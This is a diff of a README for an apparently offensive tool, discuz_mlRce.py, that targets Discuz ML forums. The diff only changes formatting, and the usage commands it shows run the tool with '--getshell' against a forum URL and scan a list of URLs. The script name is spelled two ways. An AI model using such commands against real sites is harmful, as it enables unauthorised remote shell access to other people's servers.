@@ -46,12 +46,13 @@ pip -r requirements.txt
 ----------------
 
 **GETTING Shell URL**
-<br/>
-`python ddiscuz_mlRce.py -u "http://www.ppp.cn/forum.php" --getshell`<br/>
+
+`python ddiscuz_mlRce.py -u "http://www.ppp.cn/forum.php" --getshell`
+
 ----------------
 
 **Scanning List of URL** 
-<br/>
-`python discuz_mlRce.py -f urls.txt`<br/>
+
+`python discuz_mlRce.py -f urls.txt`
 
 ----------
